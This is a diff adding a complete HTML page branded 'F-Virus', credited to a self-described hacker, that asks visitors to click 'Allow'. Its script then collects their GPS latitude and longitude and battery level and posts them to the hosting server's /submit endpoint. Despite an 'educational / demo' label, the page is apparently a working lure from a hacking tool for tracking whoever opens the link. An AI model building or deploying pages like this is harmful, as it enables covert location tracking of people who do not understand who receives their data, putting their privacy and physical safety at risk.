@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>F-Virus Permission Request</title>
+<style>
+body{font-family:Arial;background:#0b0f14;color:#e6e6e6;text-align:center}
+.card{max-width:520px;margin:60px auto;padding:20px;border-radius:12px;background:#121826}
+button{padding:12px 18px;border:0;border-radius:10px;background:#18c964;color:#000;font-weight:bold;cursor:pointer}
+.small{opacity:.8;font-size:13px}
+</style>
+</head>
+<body>
+<div class="card">
+<pre style="color:#18c964">
+███████╗██╗   ██╗██╗██████╗ ██╗   ██╗███████╗
+██╔════╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
+█████╗  ██║   ██║██║██████╔╝██║   ██║███████╗
+██╔══╝  ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║
+██║      ╚████╔╝ ██║██║  ██║╚██████╔╝███████║
+╚═╝       ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+</pre>
+
+<h2>Permission Required</h2>
+<p>This website requests your <b>location</b> and basic <b>device info</b>
+for <u>educational / demo</u> purposes.</p>
+
+<button onclick="collect()">Allow</button>
+
+<p class="small">
+Tool coded by Tanzanian hacker <b>Mr.virus</b> from Tanzania 🇹🇿<br>
+Any problem visit my IG profile: <b>@uknown_virus4040x</b>
+</p>
+</div>
+
+<script>
+async function collect(){
+  if(!navigator.geolocation){
+    alert("Geolocation not supported");
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(async pos=>{
+    let battery = "Unknown";
+    if(navigator.getBattery){
+      try{
+        const b = await navigator.getBattery();
+        battery = Math.round(b.level*100)+"%";
+      }catch(e){}
+    }
+    await fetch("/submit",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        battery: battery
+      })
+    });
+    alert("Thank you. Permission granted and data sent.");
+  }, err=>{
+    alert("Permission denied.");
+  });
+}
+</script>
+</body>
+</html>
+
